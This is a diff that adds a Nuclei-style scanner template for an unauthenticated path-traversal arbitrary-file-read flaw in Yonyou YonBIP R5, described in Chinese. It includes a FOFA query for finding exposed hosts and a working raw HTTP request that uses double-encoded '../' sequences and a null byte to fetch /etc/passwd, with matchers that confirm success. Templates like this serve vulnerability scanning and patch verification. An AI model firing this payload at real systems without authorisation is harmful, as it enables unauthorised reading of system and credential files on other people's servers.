@@ -1,0 +1,32 @@
+id: yongyouBIP-R5-yonbiplogin-File-reading
+
+info:
+  name: 用友YonBIP R5旗舰版 yonbiplogin 任意文件读取
+  author: unknown
+  severity: high
+  description: |-
+    fofa: title="数字化工作台" || title="YonBIP"
+    由于YonBIP R5旗舰版使用的Lua脚本(Nginx)不安全设计，存在路径穿越漏洞。未经身份验证的远程攻击者可以利用该漏洞实现任意文件读取，从而导致信息泄露。使系统处于极不安全的状态。
+
+  tags: File reading
+
+
+http:
+  - raw:
+      - |
+        GET /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg.js HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '/bin/bash'
+        condition: and
+      - type: status
+        status: 
+          - 200
+
